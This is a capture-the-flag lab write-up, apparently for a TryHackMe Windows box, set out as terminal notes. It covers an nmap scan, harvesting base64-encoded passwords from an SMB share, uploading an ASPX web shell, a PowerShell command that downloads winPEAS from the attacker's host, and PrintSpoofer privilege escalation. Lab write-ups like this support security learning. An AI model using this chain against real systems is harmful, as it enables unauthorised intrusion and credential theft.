REVLENT

ENUMERATION

NMAP 
"""




┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/REVLEANT]
└─$ sudo nmap  -sS -sV -p- $IP -T5  -oN nmap.txt 
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-11 04:04 EST
Stats: 0:00:58 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 16.86% done; ETC: 04:10 (0:04:41 remaining)
Stats: 0:02:31 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 70.75% done; ETC: 04:08 (0:01:02 remaining)
Nmap scan report for 10.10.81.29
Host is up (0.19s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49663/tcp open  http          Microsoft IIS httpd 10.0
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 258.50 seconds
  



"""

SMB 

"""



                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/REVLEANT]
└─$ smbclient -L $IP 
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.87.143 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                        

FOUND A SHARE  nt4wrksv lets connect to all of em one by one 
"""

nt4wrksv
"""
found password.txt




└─$ cat passwords.txt   
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk 

looks like base 64


LETS DECODE

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/REVLEANT]
└─$ echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 -d
Bob - !P@$$W0rD!123    


┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/REVLEANT]
└─$ echo 'QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk' | base64 -d
Bill - Juw4nnaM4n420696969!$$$                                                                                                                                                                       


"""

THE SMB IS BIND WITH THE HTTP PORT ON 49663 

YOU AC UPLOAD AN ASPX SHELL AND 
AND ACCESS THE SHELL THROUGH THE http://10.10.18.233:49663/nt4wrksv/shell.aspx


"""


c:\Users\Bob\Desktop>cat user.txt
cat user.txt
'cat' is not recognized as an internal or external command,
operable program or batch file.

c:\Users\Bob\Desktop>more user.txt
more user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}

c:\Users\Bob\Desktop>





"""

TRANSFER powershell -c "Invoke-WebRequest -URI 'http://10.11.61.80:9000/winPEAS.bat' -OutFile 'c:\Users\Bob\Desktop\winpeas.bat'"

PRIVESC

"""

whoami /priv

tokenimpersonation is enabled 
use printspoofer.exe -i -c cmd 

C:\Users\Administrator\Desktop>more root.txt                                                                                                                           
more root.txt                                                                                                                                                          
THM{1fk5kf469devly1gl320zafgl345pv}                                                                                                                                    
                                                                                                                                                                       
C:\Users\Administrator\Desktop> 








"""